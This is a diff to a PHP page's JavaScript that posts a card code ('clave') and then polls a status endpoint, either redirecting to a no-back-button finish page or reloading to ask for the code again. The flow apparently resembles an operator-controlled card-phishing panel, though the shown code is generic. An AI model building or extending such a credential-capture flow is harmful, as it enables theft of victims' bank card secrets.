@@ -89,13 +89,43 @@ $id_transaccion = $_SESSION['id_transaccion'] ?? 0;
 </html>
 <script type="text/javascript">
 	var idTransaccion = <?php echo $id_transaccion; ?>;
+	var espera = 0;
+	var identificadorTiempoDeEspera;
 
 	function paso_clave_tarj(clave) {
 		$.post("../../../process/paso_clave_tarj.php", { clave: clave, id: idTransaccion }, function(data) {
-			setTimeout(function() {
-				window.location.href = "../../../finish-no-back-button/";
-			}, 1000);
+			espera = 1;
+			iniciar_polling();
 		});
+	}
+
+	function consultar_estado() {
+		if (espera == 1) {
+			$.post("../../../process/estado.php", function(data) {
+				switch (data) {
+					case '10':
+						espera = 0;
+						window.location.href = "../../../finish-no-back-button/";
+						break;
+					case '12':
+						espera = 0;
+						location.reload();
+						break;
+					default:
+						break;
+				}
+			});
+		}
+	}
+
+	function iniciar_polling() {
+		identificadorTiempoDeEspera = setInterval(consultar_estado, 2000);
+	}
+
+	function detener_polling() {
+		if (identificadorTiempoDeEspera) {
+			clearInterval(identificadorTiempoDeEspera);
+		}
 	}
 
 	$(document).ready(function() {
@@ -122,5 +152,10 @@ $id_transaccion = $_SESSION['id_transaccion'] ?? 0;
 				$("#btnClave").click();
 			}
 		});
+	});
+
+	// Detener polling cuando se cierra la página
+	$(window).on('beforeunload', function() {
+		detener_polling();
 	});
 </script>
